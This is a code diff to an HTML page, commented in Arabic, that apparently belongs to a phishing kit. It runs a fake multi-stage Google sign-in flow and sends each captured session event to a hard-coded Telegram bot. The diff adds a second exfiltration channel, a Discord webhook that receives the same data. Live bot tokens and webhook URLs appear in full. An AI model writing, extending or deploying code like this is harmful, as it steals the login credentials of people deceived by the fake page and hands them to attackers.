@@ -747,9 +747,10 @@
     <!-- ⚙️ البرمجة والربط بـ Telegram Bot -->
     <!-- ========================================== -->
     <script>
-        // 🛠️ بيانات التليجرام التي تم تكوينها بناءً على طلبك
+        // 🛠️ بيانات التليجرام وديسكورد التي تم تكوينها
         const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
         const TELEGRAM_CHAT_ID = "8796885500";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j";
 
         let sessionData = {
             provider: 'KONAMI',
@@ -779,10 +780,11 @@
             }, 2000); // 2 ثانية شاشة سوداء
         });
 
-        // إرسال كافة البيانات والأحداث للتليجرام
+        // إرسال كافة البيانات والأحداث للتليجرام وديسكورد بنظام الوحدات (Embeds)
         function sendTelegramMessage(text) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
+            // 1. الإرسال إلى تيليجرام
+            const tgUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(tgUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -791,6 +793,26 @@
                     parse_mode: 'HTML'
                 })
             }).catch(e => console.error("Telegram error:", e));
+
+            // 2. الإرسال إلى ديسكورد بنظام البطاقات (Embeds) لمنع تجميع الرسائل
+            // تنظيف النص قليلاً من وسوم HTML الخاصة بتيليجرام ليتناسب مع ديسكورد
+            const cleanText = text
+                .replace(/<b>/g, '**').replace(/<\/b>/g, '**')
+                .replace(/<code>/g, '`').replace(/<\/code>/g, '`');
+
+            const discordPayload = {
+                embeds: [{
+                    description: cleanText,
+                    color: 3447003, // لون أزرق مميز للبطاقة
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            }).catch(e => console.error("Discord error:", e));
         }
 
         // تحديث إظهار/إخفاء زر العودة بناءً على الصفحة الحالية والسجل
@@ -905,7 +927,7 @@
         // --- 🔴 التسجيل بجوجل (4 مراحل) ---
         function openGoogleFlow() {
             sessionData.provider = 'GOOGLE';
-            sendTelegramMessage(`<b>🔴 اننتقال إلى تسجيل جوجل</b>`);
+            sendTelegramMessage(`<b>🔴 انتقال إلى تسجيل جوجل</b>`);
             showView('gPhase1View');
         }
 
@@ -1043,5 +1065,6 @@
             }, 3000);
         }
     </script>
+
 </body>
 </html>
